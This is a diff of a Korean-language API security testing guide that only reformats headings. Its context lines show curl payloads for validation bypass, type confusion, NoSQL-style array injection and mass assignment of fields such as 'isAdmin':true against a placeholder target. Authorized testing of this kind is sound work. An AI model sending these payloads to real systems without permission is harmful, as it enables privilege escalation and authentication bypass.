@@ -1,6 +1,6 @@
 **도구 선택:** curl만 사용. Playwright 미사용.
 
-**기본 원칙:**
+#### 기본 원칙
 - 모든 테스트는 **서버 응답 동작**으로 판정
 - 쓰기 작업 안전 수칙: 테스트 전용 리소스 생성 후 대상
 - 각 라벨 phase1 후보별 개별 테스트
@@ -12,14 +12,14 @@
 
 ### `VALIDATION_MISMATCH` — 클라이언트 검증 우회
 
-**정상 요청 (baseline):**
+#### 정상 요청 (baseline)
 ```bash
 curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "https://target/api/<endpoint>" \
   -H "Content-Type: application/json" -H "Cookie: <session>" \
   -d '{"email":"valid@example.com","age":25,"name":"TestUser"}'
 ```
 
-**검증 규칙 위반 페이로드:**
+#### 검증 규칙 위반 페이로드
 ```bash
 # 형식 위반 (이메일)
 -d '{"email":"not-an-email","age":25,"name":"TestUser"}'
@@ -48,7 +48,7 @@ curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "https://target/api/<endpoint>" \
 
 ### `TYPE_CONFUSION` — 타입 혼동
 
-**기대 타입과 다른 타입 페이로드:**
+#### 기대 타입과 다른 타입 페이로드
 ```bash
 # 문자열 → 배열 (NoSQLi 결합 가능 — nosqli-scanner)
 -d '{"username":["admin"],"password":"test"}'
@@ -72,7 +72,7 @@ curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "https://target/api/<endpoint>" \
 -d '{"count":9999999999999999999,"name":"x"}'
 ```
 
-**JS 강제 변환 악용:**
+#### JS 강제 변환 악용
 ```bash
 # 빈 문자열 (falsy)
 -d '{"token":"","admin":""}'
@@ -125,7 +125,7 @@ curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "https://target/api/<endpoint>" \
 
 ### `SCHEMA_DEFECT` — 스키마 검증 결함
 
-**미정의 필드 주입:**
+#### 미정의 필드 주입
 ```bash
 -d '{"name":"test","email":"x@x.com","role":"admin","isAdmin":true,"__internal_flag":true,"_id":"override","createdAt":"1900-01-01"}'
 
@@ -136,12 +136,12 @@ curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "https://target/api/<endpoint>" \
 -d '{"items":[{"id":1,"hidden_admin":true}]}'
 ```
 
-**필수 필드 누락:**
+#### 필수 필드 누락
 ```bash
 -d '{"optional_field":"value"}'
 ```
 
-**Content-Type 불일치:**
+#### Content-Type 불일치
 ```bash
 # JSON endpoint에 form-urlencoded
 curl -X POST "https://target/api/<endpoint>" \
